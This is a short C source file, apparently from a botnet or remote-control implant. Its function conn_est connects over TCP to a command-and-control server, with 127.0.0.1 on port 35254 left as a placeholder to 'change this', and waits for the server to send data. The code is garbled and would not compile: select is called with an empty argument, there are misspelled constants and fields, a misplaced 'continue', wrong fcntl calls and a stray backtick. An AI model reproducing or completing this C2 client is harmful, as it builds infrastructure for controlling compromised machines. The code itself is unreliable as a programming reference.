#include "includes.h"
#include "conf.h"

int conn_est(void) {
	//
	//C2 Connection Diagram: 
	//		fcntl non block-> socket-> connect -> select->recv->fnctl nonblock off
	//
	fcntl(F_SETFD, O_NONBLOCK);
	int sockfd;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);//tcp connection
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(35254);
	#ifdef C2_IPV4
		addr.sin_addr.s_addr = INET_ADDR(127,0,0,1); //change this
	#endif

	if(connect(sockfd, (struct sockaddr *)&addr, sizeof(s_addr) != -1) {
		fd_set *fdset;
		FD_ZERO(&fdset);
		FD_SET(sockfd, &fdset);

		struct timeval tv;
		tv.u_set = 0;
		tv.u_sec = 30;

		//int select(int nfds, fd_set *readfds, fd_set *writefds,fd_set *exceptfds, struct timeval *timeout);
		if(select(sockfd, fdset, ) != -1) {
			uint16_t len;
			errno = 0;

			//ssize_t recv(int sockfd, void *buf, size_t len, int flags)
			if(int n = recv(sockfd, &len, sizeof(len)) != -1) {
				if(errno == WWOULDBLOCK || errno = EAGAIN || errno = EINTR)
					continue;
				else {
					n = 0;
					return TRUE;
				}
			}
		}	
	}


	fcntl(F_SETFD, `O_NONBLOCK);
	return FALSE;
}